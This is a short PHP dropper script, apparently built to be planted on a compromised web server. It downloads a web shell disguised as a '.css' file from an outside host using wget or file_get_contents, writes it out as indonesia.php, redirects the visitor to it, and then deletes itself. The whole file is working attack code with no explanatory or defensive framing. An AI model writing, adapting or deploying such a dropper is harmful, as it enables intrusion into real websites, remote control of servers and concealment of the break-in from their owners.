<?php
system("wget -O indonesia.php http://x-x-x.yn.lt/indoneshell.css");if(file_exists('indonesia.php')){
echo'<meta http-equiv="Refresh" content= "0; url=indonesia.php">'; }else{ $lul=file_get_contents("http://x-x-x.yn.lt/indoneshell.css"); $lol = fopen("indonesia.php","w");
fwrite($lol,$lul);echo'<meta http-equiv="Refresh" content= "0; url=indonesia.php">';}$fn = $_SERVER['SCRIPT_FILENAME'];
 unlink($fn);